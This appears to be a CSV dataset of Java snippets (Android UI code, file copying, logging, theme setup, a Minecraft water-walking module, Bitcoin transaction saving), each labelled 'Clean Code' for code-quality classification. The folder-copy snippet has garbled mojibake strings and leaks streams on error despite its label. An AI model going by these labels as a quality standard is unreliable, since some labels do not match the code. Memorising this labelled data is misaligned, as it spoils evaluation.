text,label,text_label
"@Override public void drawOnScrimWithScale(Canvas canvas,float scale){
  final View panel=mBottomSheetBackground;
  final boolean hasBottomSheet=panel.getVisibility() == VISIBLE;
  final float translationY=((View)panel.getParent()).getTranslationY();
  final float horizontalScaleOffset=(1 - scale) * panel.getWidth() / 2;
  final float verticalScaleOffset=(1 - scale) * (panel.getHeight() - getHeight() / 2);
  final float topNoScale=panel.getTop() + translationY;
  final float topWithScale=topNoScale + verticalScaleOffset;
  final float leftWithScale=panel.getLeft() + horizontalScaleOffset;
  final float rightWithScale=panel.getRight() - horizontalScaleOffset;
  if (hasBottomSheet) {
    mHeaderPaint.setColor(mBottomSheetBackgroundColor);
    mHeaderPaint.setAlpha((int)(255 * mBottomSheetAlpha));
    mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,panel.getBottom());
    mTmpPath.reset();
    mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
    canvas.drawPath(mTmpPath,mHeaderPaint);
  }
  if (DEBUG_HEADER_PROTECTION) {
    mHeaderPaint.setColor(Color.MAGENTA);
    mHeaderPaint.setAlpha(255);
  }
 else {
    mHeaderPaint.setColor(mHeaderColor);
    mHeaderPaint.setAlpha((int)(getAlpha() * Color.alpha(mHeaderColor)));
  }
  if (mHeaderPaint.getColor() == mScrimColor || mHeaderPaint.getColor() == 0) {
    return;
  }
  final float headerBottomNoScale=getHeaderBottom() + getVisibleContainerView().getPaddingTop();
  final float headerHeightNoScale=headerBottomNoScale - topNoScale;
  final float headerBottomWithScaleOnTablet=topWithScale + headerHeightNoScale * scale;
  final float headerBottomOffset=(getVisibleContainerView().getHeight() * (1 - scale) / 2);
  final float headerBottomWithScaleOnPhone=headerBottomNoScale * scale + headerBottomOffset;
  final FloatingHeaderView headerView=getFloatingHeaderView();
  if (hasBottomSheet) {
    if (!isSearchBarFloating() || mUsingTabs) {
      mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,headerBottomWithScaleOnTablet);
      mTmpPath.reset();
      mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
      canvas.drawPath(mTmpPath,mHeaderPaint);
    }
  }
 else {
    canvas.drawRect(0,0,canvas.getWidth(),headerBottomWithScaleOnPhone,mHeaderPaint);
  }
  final int tabsHeight=headerView.getPeripheralProtectionHeight();
  if (mTabsProtectionAlpha > 0 && tabsHeight != 0) {
    if (DEBUG_HEADER_PROTECTION) {
      mHeaderPaint.setColor(Color.BLUE);
      mHeaderPaint.setAlpha(255);
    }
 else {
      mHeaderPaint.setAlpha((int)(getAlpha() * mTabsProtectionAlpha));
    }
    float left=0f;
    float right=canvas.getWidth();
    if (hasBottomSheet) {
      left=mBottomSheetBackground.getLeft() + horizontalScaleOffset;
      right=mBottomSheetBackground.getRight() - horizontalScaleOffset;
    }
    final float tabTopWithScale=hasBottomSheet ? headerBottomWithScaleOnTablet : headerBottomWithScaleOnPhone;
    final float tabBottomWithScale=tabTopWithScale + tabsHeight * scale;
    canvas.drawRect(left,tabTopWithScale,right,tabBottomWithScale,mHeaderPaint);
  }
}",0,Clean Code
"public static void copyFolder(String sourcePath,String targetPath) throws Exception {
  File sourceFile=new File(sourcePath);
  File targetFile=new File(targetPath);
  if (!sourceFile.exists()) {
    throw new Exception(""鏂囦欢澶逛笉瀛樺湪"");
  }
  if (!sourceFile.isDirectory()) {
    throw new Exception(""婧愭枃浠跺す涓嶆槸鐩綍"");
  }
  if (!targetFile.exists()) {
    targetFile.mkdirs();
  }
  if (!targetFile.isDirectory()) {
    throw new Exception(""鐩爣鏂囦欢澶逛笉鏄洰褰�"");
  }
  File[] files=sourceFile.listFiles();
  if (files == null || files.length == 0) {
    return;
  }
  for (  File file : files) {
    String movePath=targetFile + File.separator + file.getName();
    if (file.isDirectory()) {
      copyFolder(file.getAbsolutePath(),movePath);
    }
 else {
      BufferedInputStream in=new BufferedInputStream(new FileInputStream(file));
      BufferedOutputStream out=new BufferedOutputStream(new FileOutputStream(movePath));
      byte[] b=new byte[1024];
      int temp=0;
      while ((temp=in.read(b)) != -1) {
        out.write(b,0,temp);
      }
      out.close();
      in.close();
    }
  }
}",0,Clean Code
"/** 
 * Returns the translation X value for view when it goes out of the scene 
 */
float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  return view.getTranslationX();
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final boolean isRtl=sceneRoot.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL;
  final float x;
  if (isRtl) {
    x=view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
 else {
    x=view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
  return x;
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final boolean isRtl=sceneRoot.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL;
  final float x;
  if (isRtl) {
    x=view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
 else {
    x=view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
  return x;
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final int viewCenter=position[0] + view.getWidth() / 2;
  sceneRoot.getLocationOnScreen(position);
  Rect center=t.getEpicenter();
  final int sceneRootCenter=center == null ? (position[0] + sceneRoot.getWidth() / 2) : center.centerX();
  if (viewCenter < sceneRootCenter) {
    return view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
 else {
    return view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
}",0,Clean Code
"public LayoutParams(Context c,AttributeSet attrs){
  super(c,attrs);
}
public LayoutParams(int width,int height){
  super(width,height);
}
public LayoutParams(int width,int height,int gravity){
  super(width,height,gravity);
}
public LayoutParams(ViewGroup.LayoutParams p){
  super(p);
}
public LayoutParams(MarginLayoutParams source){
  super(source);
}
@RequiresApi(19) public LayoutParams(FrameLayout.LayoutParams source){
  super(source);
}",0,Clean Code
"public static void writeLog(Object msg,String level){
  Logger logger=PluginLogUtils.getLogger();
  if (DEBUG.equals(level)) {
    if (logger != null && logger.isDebugEnabled()) {
      logger.debug(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (INFO.equals(level)) {
    if (logger != null && logger.isInfoEnabled()) {
      logger.info(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (WARN.equals(level)) {
    if (logger != null && logger.isWarnEnabled()) {
      logger.warn(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (ERROR.equals(level)) {
    if (logger != null && logger.isErrorEnabled()) {
      logger.error(PluginLogUtils.getMsg(msg));
    }
  }
 else {
    if (logger != null && logger.isErrorEnabled()) {
      logger.error("""");
    }
  }
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.AdaGradRDADenseTensorProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.AdaGradRDADenseTensorProto other=(org.tribuo.math.protos.AdaGradRDADenseTensorProto)obj;
  if (hasData() != other.hasData())   return false;
  if (hasData()) {
    if (!getData().equals(other.getData()))     return false;
  }
  if (java.lang.Double.doubleToLongBits(getLearningRate()) != java.lang.Double.doubleToLongBits(other.getLearningRate()))   return false;
  if (java.lang.Double.doubleToLongBits(getEpsilon()) != java.lang.Double.doubleToLongBits(other.getEpsilon()))   return false;
  if (java.lang.Double.doubleToLongBits(getL1()) != java.lang.Double.doubleToLongBits(other.getL1()))   return false;
  if (java.lang.Double.doubleToLongBits(getL2()) != java.lang.Double.doubleToLongBits(other.getL2()))   return false;
  if (!getGradNorms().equals(other.getGradNorms()))   return false;
  if (getIteration() != other.getIteration())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}",0,Clean Code
"public static void setupLaf(String[] args){
  try {
    if (args.length > 0)     UIManager.setLookAndFeel(args[0]);
 else {
      String lafClassName=state.get(KEY_LAF,FlatLightLaf.class.getName());
      if (IntelliJTheme.ThemeLaf.class.getName().equals(lafClassName)) {
        String theme=state.get(KEY_LAF_THEME,"""");
        if (theme.startsWith(RESOURCE_PREFIX))         IntelliJTheme.setup(IJThemesPanel.class.getResourceAsStream(IJThemesPanel.THEMES_PACKAGE + theme.substring(RESOURCE_PREFIX.length())));
 else         if (theme.startsWith(FILE_PREFIX))         FlatLaf.setup(IntelliJTheme.createLaf(new FileInputStream(theme.substring(FILE_PREFIX.length()))));
 else         FlatLightLaf.setup();
        if (!theme.isEmpty())         UIManager.getLookAndFeelDefaults().put(THEME_UI_KEY,theme);
      }
 else       if (FlatPropertiesLaf.class.getName().equals(lafClassName)) {
        String theme=state.get(KEY_LAF_THEME,"""");
        if (theme.startsWith(FILE_PREFIX)) {
          File themeFile=new File(theme.substring(FILE_PREFIX.length()));
          String themeName=StringUtils.removeTrailing(themeFile.getName(),"".properties"");
          FlatLaf.setup(new FlatPropertiesLaf(themeName,themeFile));
        }
 else         FlatLightLaf.setup();
        if (!theme.isEmpty())         UIManager.getLookAndFeelDefaults().put(THEME_UI_KEY,theme);
      }
 else       UIManager.setLookAndFeel(lafClassName);
    }
  }
 catch (  Throwable ex) {
    LoggingFacade.INSTANCE.logSevere(null,ex);
    FlatLightLaf.setup();
  }
  UIManager.addPropertyChangeListener(e -> {
    if (""lookAndFeel"".equals(e.getPropertyName()))     state.put(KEY_LAF,UIManager.getLookAndFeel().getClass().getName());
  }
);
}",0,Clean Code
"/** 
 * Inserts view into the wrapper.
 */
public void wrap(View view){
  if (!mInitialized || mWrappedView != null) {
    throw new IllegalStateException();
  }
  ViewGroup.LayoutParams lp=view.getLayoutParams();
  if (lp != null) {
    ViewGroup.LayoutParams wrapped_lp=new FrameLayout.LayoutParams(lp.width,lp.height);
    lp.width=lp.width == LayoutParams.MATCH_PARENT ? LayoutParams.MATCH_PARENT : LayoutParams.WRAP_CONTENT;
    lp.height=lp.height == LayoutParams.MATCH_PARENT ? LayoutParams.MATCH_PARENT : LayoutParams.WRAP_CONTENT;
    this.setLayoutParams(lp);
    addView(view,wrapped_lp);
  }
 else {
    addView(view);
  }
  if (mRoundedCorners && mShadowType != SHADOW_DYNAMIC) {
    RoundedRectHelper.setClipToRoundedOutline(this,true);
  }
  mWrappedView=view;
}
",0,Clean Code
"private Properties.Comment commentFromLine(String line,String prefix,Properties.Comment.Delimiter delimiter){
  StringBuilder prefixBuilder=new StringBuilder(prefix);
  StringBuilder message=new StringBuilder();
  boolean inComment=false;
  int state=0;
  for (  char c : line.toCharArray()) {
switch (state) {
case 0:
      if (Character.isWhitespace(c)) {
        prefixBuilder.append(c);
        break;
      }
    state++;
case 1:
  if ((c == '#' || c == '!') && !inComment) {
    inComment=true;
    continue;
  }
 else   if (!Character.isWhitespace(c)) {
    message.append(c);
    break;
  }
state++;
case 2:
if (!Character.isWhitespace(c)) {
message.append(c);
state--;
break;
}
 else {
message.append(c);
}
}
}
return new Properties.Comment(randomId(),prefixBuilder.toString(),Markers.EMPTY,delimiter,message.toString());
}",0,Clean Code
"public static String formatAttributeMap(final HashMap<String,String> attributeMap){
  final StringBuilder builder=new StringBuilder();
  builder.append(DICTIONARY_TAG + ""="");
  if (attributeMap.containsKey(DictionaryHeader.DICTIONARY_ID_KEY)) {
    builder.append(attributeMap.get(DictionaryHeader.DICTIONARY_ID_KEY));
  }
  for (  final String key : attributeMap.keySet()) {
    if (key.equals(DictionaryHeader.DICTIONARY_ID_KEY)) {
      continue;
    }
    final String value=attributeMap.get(key);
    builder.append("","" + key + ""=""+ value);
  }
  builder.append(""\n"");
  return builder.toString();
}
",0,Clean Code
"private boolean waterShouldBeSolid(){
  if (EntityUtils.getGameMode(mc.player) == GameMode.SPECTATOR || mc.player.getAbilities().flying)   return false;
  if (mc.player.getVehicle() != null) {
    EntityType<?> vehicle=mc.player.getVehicle().getType();
    if (vehicle == EntityType.BOAT || vehicle == EntityType.CHEST_BOAT)     return false;
  }
  if (Modules.get().get(Flight.class).isActive())   return false;
  if (dipIfBurning.get() && mc.player.isOnFire())   return false;
  if (dipOnSneakWater.get() && mc.options.sneakKey.isPressed())   return false;
  if (dipOnFallWater.get() && mc.player.fallDistance > dipFallHeightWater.get())   return false;
  return waterMode.get() == Mode.Solid;
}
",0,Clean Code
"public static void register(){
  ActivityThread activityThread=ActivityThread.currentActivityThread();
  if (activityThread == null) {
    LOGGER.w(""ActivityThread is null"");
    return;
  }
  IntentFilter intentFilter=new IntentFilter();
  intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
  intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
  intentFilter.addAction(Intent.ACTION_PACKAGE_FULLY_REMOVED);
  intentFilter.addDataScheme(""package"");
  Handler handler=new Handler(Looper.getMainLooper());
  try {
    Refine.<ContextHidden>unsafeCast(ActivityThread.currentActivityThread().getSystemContext()).registerReceiverAsUser(RECEIVER,Refine.unsafeCast(UserHandleHidden.ALL),intentFilter,null,handler);
    LOGGER.d(""register package receiver"");
  }
 catch (  Throwable e) {
    LOGGER.w(""registerReceiver failed"",e);
  }
}
",0,Clean Code
"public void saveFinalTransaction(ActionEvent event){
  Stage window=new Stage();
  FileChooser fileChooser=new FileChooser();
  fileChooser.setTitle(""Save Final Transaction"");
  if (headersForm.getName() != null && !headersForm.getName().isEmpty()) {
    fileChooser.setInitialFileName(headersForm.getName().replace("".psbt"","""") + "".txn"");
  }
  AppServices.moveToActiveWindowScreen(window,800,450);
  File file=fileChooser.showSaveDialog(window);
  if (file != null) {
    try {
      try (PrintWriter writer=new PrintWriter(file,StandardCharsets.UTF_8)){
        Transaction finalTx=headersForm.getPsbt().extractTransaction();
        writer.print(Utils.bytesToHex(finalTx.bitcoinSerialize()));
      }
     }
 catch (    IOException e) {
      log.error(""Error saving transaction"",e);
      AppServices.showErrorDialog(""Error saving transaction"",""Cannot write to "" + file.getAbsolutePath());
    }
  }
}",0,Clean Code
"private void applyCrossKey(View v,MotionEvent e){
  int[] boardPos=new int[2];
  int[] touchPos=new int[2];
  int[] shiftPos=new int[2];
  int buttonWidth=v.getWidth();
  int buttonheight=v.getHeight();
  crossKeyboard.getLocationOnScreen(boardPos);
  touchPos[0]=(int)e.getRawX();
  touchPos[1]=(int)e.getRawY();
  shiftPos[0]=touchPos[0] - boardPos[0];
  shiftPos[1]=touchPos[1] - boardPos[1];
  int location;
  if (shiftPos[0] < buttonWidth && shiftPos[0] >= 0) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=1;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=4;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=7;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] <= buttonWidth * 2 && shiftPos[0] >= buttonWidth) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=2;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=5;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=8;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] > buttonWidth * 2 && shiftPos[0] <= buttonWidth * 3) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=3;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=6;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=9;
    }
 else {
      location=0;
    }
  }
 else {
    location=0;
  }
  uiUpdate(location,e);
  makeKeyEvent(location,e);
}",0,Clean Code
